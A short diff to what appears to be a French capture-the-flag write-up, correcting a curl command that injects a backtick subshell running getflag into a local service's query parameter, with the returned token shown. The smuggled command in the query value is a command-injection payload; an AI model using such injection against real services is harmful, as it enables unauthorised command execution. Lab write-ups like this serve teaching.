@@ -41,7 +41,7 @@ On peut donc injecter un subshell pour que son echo affiche le resultat
 :~$ curl localhost:4747?x=toto
 toto
 
-:~$ curl 'localhost?x=`getflag`'
+:~$ curl 'localhost:4747?x=`getflag`'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
 
